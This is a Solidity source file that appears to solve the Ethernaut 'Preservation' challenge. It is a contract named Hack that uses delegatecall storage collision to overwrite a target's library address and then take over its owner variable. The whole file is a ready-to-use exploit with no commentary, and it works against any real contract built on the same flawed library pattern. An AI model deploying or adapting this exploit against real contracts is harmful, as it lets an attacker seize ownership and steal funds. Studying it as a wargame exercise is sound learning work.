// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;

    function setSecondTime(uint256 _timeStamp) external;

    function owner() external view returns (address);

    function timeZone1Library() external view returns (address);

    function timeZone2Library() external view returns (address);
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}
